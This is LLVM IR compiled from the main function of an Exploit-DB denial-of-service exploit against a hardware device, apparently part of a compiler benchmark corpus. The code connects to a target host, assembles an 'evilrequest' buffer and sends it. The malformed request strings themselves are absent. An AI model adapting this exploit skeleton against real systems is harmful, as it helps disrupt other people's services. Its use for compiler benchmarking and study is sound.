; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_1274.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_1274.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [3 x i8] c"80\00", align 1
@.str.1 = private unnamed_addr constant [31 x i8] c"[+] Connecting to remote host\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"[+] Creating buffer\0A\00", align 1
@BUGSTR = common dso_local global i8* null, align 8
@evilrequest = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [41 x i8] c"[+] Sending %d bytes of painfull buffer\0A\00", align 1
@.str.4 = private unnamed_addr constant [27 x i8] c"[X] Failed to send buffer\0A\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"[+] Done, Packet Sent\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca [256 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 (...) @banner()
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 3
  br i1 %13, label %14, label %17

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 2
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8** %16, align 8
  br label %35

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 2
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @atoi(i8* %20)
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %29, label %23

23:                                               ; preds = %17
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  %28 = icmp sgt i32 %27, 65534
  br i1 %28, label %29, label %34

29:                                               ; preds = %23, %17
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @usage(i8* %32)
  br label %34

34:                                               ; preds = %29, %23
  br label %35

35:                                               ; preds = %34, %14
  %36 = load i32, i32* %4, align 4
  %37 = icmp slt i32 %36, 2
  br i1 %37, label %38, label %43

38:                                               ; preds = %35
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @usage(i8* %41)
  br label %43

43:                                               ; preds = %38, %35
  %44 = call i64 @malloc(i32 1024)
  %45 = inttoptr i64 %44 to i8*
  store i8* %45, i8** %9, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0))
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 1
  %49 = load i8*, i8** %48, align 8
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 2
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @atoi(i8* %52)
  %54 = call i32 @remote_connect(i8* %49, i32 %53)
  store i32 %54, i32* %6, align 4
  %55 = call i32 @sleep(i32 1)
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %57 = load i8*, i8** %9, align 8
  %58 = load i8*, i8** @BUGSTR, align 8
  %59 = load i8*, i8** @evilrequest, align 8
  %60 = call i32 @sprintf(i8* %57, i8* %58, i8* %59)
  %61 = load i8*, i8** @evilrequest, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0), i32 %62)
  %64 = load i32, i32* %6, align 4
  %65 = load i8*, i8** %9, align 8
  %66 = load i8*, i8** %9, align 8
  %67 = call i32 @strlen(i8* %66)
  %68 = call i64 @send(i32 %64, i8* %65, i32 %67, i32 0)
  %69 = icmp sle i64 %68, 0
  br i1 %69, label %70, label %75

70:                                               ; preds = %43
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0))
  %72 = load i32, i32* %6, align 4
  %73 = call i32 @close(i32 %72)
  %74 = call i32 @exit(i32 1) #3
  unreachable

75:                                               ; preds = %43
  %76 = call i32 @sleep(i32 1)
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  %78 = load i32, i32* %6, align 4
  %79 = call i32 @close(i32 %78)
  %80 = load i8*, i8** %9, align 8
  %81 = call i32 @free(i8* %80)
  store i8* null, i8** %9, align 8
  ret i32 0
}

declare dso_local i32 @banner(...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @remote_connect(i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
